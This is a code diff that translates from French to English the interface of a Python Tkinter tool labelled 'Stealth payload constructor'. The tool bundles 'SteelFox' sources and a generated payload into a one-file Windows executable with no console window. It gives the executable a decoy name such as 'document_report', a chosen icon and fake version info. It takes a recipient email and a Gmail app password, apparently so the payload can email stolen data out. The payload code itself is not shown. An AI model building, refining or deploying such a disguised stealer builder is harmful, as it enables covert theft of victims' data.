@@ -276,7 +276,7 @@ class BuilderApp:
             except Exception:
                 pass
         
-        tk.Label(header, text="Constructeur de payload furtif",
+        tk.Label(header, text="Stealth payload constructor",
                  font=FONT_SM, bg=BG, fg=FG_DIM).pack()
 
         _separator(root).pack(fill="x")
@@ -293,13 +293,13 @@ class BuilderApp:
             frm.pack(fill="x", padx=28)
             return frm
 
-        # ── Nom du fichier ──
-        f = section("Nom du fichier executable")
-        self._name_var = tk.StringVar(value="rapport_document")
+        # ── Output filename ──
+        f = section("Output filename")
+        self._name_var = tk.StringVar(value="document_report")
         _entry(f, textvariable=self._name_var, width=46).pack(fill="x")
 
-        # ── Icône ──
-        f = section("Icone")
+        # ── Icon ──
+        f = section("Icon")
         icon_row = tk.Frame(f, bg=BG2)
         icon_row.pack(fill="x")
 
@@ -312,22 +312,22 @@ class BuilderApp:
         self._icon_combo.pack(side="left")
         self._icon_combo.bind("<<ComboboxSelected>>", self._update_icon_preview)
         
-        _btn(icon_row, "Image personnalisee ...", self._pick_icon).pack(side="right")
+        _btn(icon_row, "Custom image ...", self._pick_icon).pack(side="right")
         
         self._icon_preview_lbl = tk.Label(icon_row, bg=BG2)
         self._icon_preview_lbl.pack(side="left", padx=(15, 0))
         self._update_icon_preview()
 
-        # ── E-mail Destinataire ──
-        f = section("Adresse e-mail de reception (destinataire)")
+        # ── Recipient email ──
+        f = section("Recipient email address")
         self._receiver_var = tk.StringVar()
         _entry(f, textvariable=self._receiver_var, width=46).pack(fill="x")
 
-        # ── E-mail Expéditeur ──
-        f = section("Adresse e-mail d'envoi (expediteur)")
+        # ── Sender email ──
+        f = section("Sender email address")
         
         self._same_email_var = tk.BooleanVar(value=True)
-        chk = tk.Checkbutton(f, text="Utiliser la meme adresse pour l'envoi", 
+        chk = tk.Checkbutton(f, text="Use same address for sending", 
                              variable=self._same_email_var, command=self._toggle_sender,
                              bg=BG2, fg=FG_DIM, selectcolor=BG3, activebackground=BG2, activeforeground=FG)
         chk.pack(anchor="w", pady=(0, 5))
@@ -337,20 +337,20 @@ class BuilderApp:
         self._sender_entry.pack(fill="x")
         self._toggle_sender()
 
-        # ── Mot de passe d'application ──
-        f = section("Mot de passe d'application Google (expediteur)")
+        # ── App password ──
+        f = section("Google app password (sender account)")
         self._pass_var = tk.StringVar()
         _entry(f, textvariable=self._pass_var, show="*", width=46).pack(fill="x")
         lnk = tk.Label(
-            f, text="Comment obtenir un mot de passe d'application ?",
+            f, text="How to get a Google app password?",
             font=FONT_SM, bg=BG2, fg=FG_LINK, cursor="hand2",
         )
         lnk.pack(anchor="w", pady=(4, 0))
         lnk.bind("<Button-1>", lambda _: webbrowser.open(
             "https://support.google.com/accounts/answer/185833"))
 
-        # ── Dossier de sortie ──
-        f = section("Dossier de sortie de l'executable")
+        # ── Output directory ──
+        f = section("Output directory")
         out_row = tk.Frame(f, bg=BG2)
         out_row.pack(fill="x")
         self._outdir_var = tk.StringVar(value=str(ROOT_DIR))
@@ -363,7 +363,7 @@ class BuilderApp:
         foot.pack(fill="x", padx=24)
 
         self._build_btn = _btn(
-            foot, "Construire l'executable", self._start_build, accent=True,
+            foot, "Build executable", self._start_build, accent=True,
         )
         self._build_btn.pack(fill="x")
 
@@ -383,16 +383,16 @@ class BuilderApp:
 
     def _list_icons(self) -> list[str]:
         if not ASSETS_DIR.exists():
-            return ["(aucun)"]
+            return ["(none)"]
         icons = sorted(p.stem for p in ASSETS_DIR.glob("*.ico"))
-        return icons if icons else ["(aucun)"]
+        return icons if icons else ["(none)"]
 
     def _pick_icon(self) -> None:
         path = filedialog.askopenfilename(
-            title="Choisir une icone ou une image",
+            title="Choose an icon or image",
             filetypes=[
-                ("Images / Icones", "*.ico *.png *.jpg *.jpeg *.bmp"),
-                ("Tous les fichiers", "*.*"),
+                ("Images / Icons", "*.ico *.png *.jpg *.jpeg *.bmp"),
+                ("All files", "*.*"),
             ],
         )
         if path:
@@ -417,7 +417,7 @@ class BuilderApp:
         if self._custom_icon_path:
             return self._custom_icon_path
         stem = self._icon_var.get().strip()
-        if stem and stem != "(aucun)":
+        if stem and stem != "(none)":
             ico = ASSETS_DIR / f"{stem}.ico"
             if ico.exists():
                 return str(ico)
@@ -425,7 +425,7 @@ class BuilderApp:
 
     def _pick_outdir(self) -> None:
         d = filedialog.askdirectory(
-            title="Choisir le dossier de sortie",
+            title="Choose output directory",
             initialdir=self._outdir_var.get(),
         )
         if d:
@@ -440,25 +440,24 @@ class BuilderApp:
         out      = self._outdir_var.get().strip()
 
         if not name:
-            messagebox.showerror("Champ manquant", "Veuillez saisir un nom de fichier.")
+            messagebox.showerror("Missing field", "Please enter an output filename.")
             return False
         if not _EMAIL_RE.match(receiver):
-            messagebox.showerror("E-mail invalide", "L'adresse e-mail de reception n'est pas valide.")
+            messagebox.showerror("Invalid email", "The recipient email address is not valid.")
             return False
         if not _EMAIL_RE.match(sender):
-            messagebox.showerror("E-mail invalide", "L'adresse e-mail d'envoi n'est pas valide.")
+            messagebox.showerror("Invalid email", "The sender email address is not valid.")
             return False
         if not pwd:
-            messagebox.showerror("Champ manquant", "Veuillez saisir le mot de passe d'application Google.")
+            messagebox.showerror("Missing field", "Please enter the Google app password.")
             return False
         if not os.path.isdir(out):
-            messagebox.showerror("Dossier invalide", f"Le dossier de sortie est introuvable :\n{out}")
+            messagebox.showerror("Invalid directory", f"Output directory not found:\n{out}")
             return False
             
-        # Vérifier si le fichier existe déjà
         dest_file = Path(out) / f"{name}.exe"
         if dest_file.exists():
-            if not messagebox.askyesno("Fichier existant", f"Le fichier {name}.exe existe deja dans le dossier de sortie.\nVoulez-vous l'ecraser ?"):
+            if not messagebox.askyesno("File exists", f"{name}.exe already exists in the output directory.\nOverwrite it?"):
                 return False
                 
         return True
@@ -468,7 +467,7 @@ class BuilderApp:
         if not self._validate():
             return
         self._build_btn.config(state="disabled")
-        self._set_status("Construction en cours...", FG_DIM)
+        self._set_status("Build in progress...", FG_DIM)
         threading.Thread(target=self._build_worker, daemon=True).start()
 
     def _build_worker(self) -> None:
@@ -483,20 +482,20 @@ class BuilderApp:
             with tempfile.TemporaryDirectory() as tmpdir:
                 tmp = Path(tmpdir)
 
-                self._set_status("Copie des sources SteelFox...", FG_DIM)
+                self._set_status("Copying SteelFox sources...", FG_DIM)
                 self._copy_steelfox(tmp)
 
                 # Générer dynamiquement les infos de version Windows
                 self._write_version_info(tmp, name)
 
-                self._set_status("Generation du payload...", FG_DIM)
+                self._set_status("Generating payload...", FG_DIM)
                 script = tmp / "payload.py"
                 script.write_text(self._generate_payload(receiver, sender, pwd), encoding="utf-8")
 
-                self._set_status("Traitement de l'icone...", FG_DIM)
+                self._set_status("Processing icon...", FG_DIM)
                 icon_path = self._resolve_icon(tmp)
 
-                self._set_status("Compilation avec PyInstaller... (peut prendre 1-2 min)", FG_DIM)
+                self._set_status("Compiling with PyInstaller... (may take 1-2 min)", FG_DIM)
                 exe = self._pyinstaller_build(tmp, script, name, icon_path)
 
                 dest = out_dir / f"{name}.exe"
@@ -517,9 +516,9 @@ class BuilderApp:
         src_main = ROOT_DIR / "steelfox.py"
 
         if not src_pkg.exists():
-            raise FileNotFoundError(f"Package SteelFox introuvable : {src_pkg}")
+            raise FileNotFoundError(f"SteelFox package not found: {src_pkg}")
         if not src_main.exists():
-            raise FileNotFoundError(f"steelfox.py introuvable : {src_main}")
+            raise FileNotFoundError(f"steelfox.py not found: {src_main}")
 
         shutil.copytree(str(src_pkg), str(tmp / "steelfox"),
                         ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
@@ -586,7 +585,7 @@ VSVersionInfo(
             return str(dst)
 
         stem = self._icon_var.get().strip()
-        if stem and stem != "(aucun)":
+        if stem and stem != "(none)":
             ico  = ASSETS_DIR / f"{stem}.ico"
             if ico.exists():
                 dst = tmp / ico.name
@@ -611,7 +610,7 @@ VSVersionInfo(
         cmd = [
             sys.executable, "-m", "PyInstaller",
             "--onefile",
-            "--windowed",                           # aucune console visible
+            "--windowed",                           # no console window
             "--noconfirm",
             "--clean",
             "--name", name,
@@ -680,15 +679,15 @@ VSVersionInfo(
             except Exception:
                 pass
             raise RuntimeError(
-                f"PyInstaller a echoue (code {result.returncode}).\n"
-                f"Log complet sauvegarde dans : {log_file}\n\n"
+                f"PyInstaller failed (code {result.returncode}).\n"
+                f"Full log saved to: {log_file}\n\n"
                 + full_log[-2000:]
             )
 
         exe = tmp / "dist" / f"{name}.exe"
         if not exe.exists():
             raise FileNotFoundError(
-                f"Executable attendu introuvable : {exe}\n"
+                f"Expected executable not found: {exe}\n"
                 + result.stdout[-1000:]
             )
         return exe
@@ -702,16 +701,16 @@ VSVersionInfo(
 
     def _on_build_success(self, dest: str) -> None:
         self._build_btn.config(state="normal")
-        self._status_var.set(f"Executable cree avec succes !")
+        self._status_var.set("Executable built successfully!")
         self._status_lbl.config(fg="#55dd55")
-        messagebox.showinfo("Construction reussie",
-                            f"L'executable a ete cree :\n\n{dest}")
+        messagebox.showinfo("Build successful",
+                            f"Executable created at:\n\n{dest}")
 
     def _on_build_error(self, msg: str) -> None:
         self._build_btn.config(state="normal")
-        self._status_var.set("La construction a echoue.")
+        self._status_var.set("Build failed.")
         self._status_lbl.config(fg="#ff5555")
-        messagebox.showerror("Erreur de construction", msg[:900])
+        messagebox.showerror("Build error", msg[:900])
 
 
 # ─── Point d'entrée ───────────────────────────────────────────────────────
